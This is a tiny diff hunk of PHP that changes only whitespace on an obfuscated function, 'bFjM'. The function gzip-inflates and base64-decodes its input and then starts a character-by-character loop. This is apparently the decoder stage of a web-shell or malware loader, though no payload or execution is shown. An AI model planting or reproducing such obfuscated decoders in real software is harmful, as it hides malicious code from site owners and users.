@@ -1,4 +1,4 @@
- function bFjM($ruUpBy)
+function bFjM($ruUpBy)
 { 
 $ruUpBy=gzinflate(base64_decode($ruUpBy));
  for($i=0;$i<strlen($ruUpBy);$i++)
